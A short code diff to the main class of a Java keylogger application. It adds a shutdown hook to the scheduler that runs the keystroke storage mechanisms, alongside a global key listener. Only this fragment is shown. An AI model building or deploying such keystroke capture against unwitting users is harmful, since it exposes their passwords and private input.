@@ -15,6 +15,6 @@ public class KeyboardLoggerApp {
         List<StoreMechanism> storeMechanisms = keyTrackerService.getStoreMechanisms();
 
         new GlobalKeyListener().addKeyListener(keyListener);
-        new MechanismsScheduleRunner(storeMechanisms).scheduleAll();
+        new MechanismsScheduleRunner(storeMechanisms).addShutdownHook().scheduleAll();
     }
 }
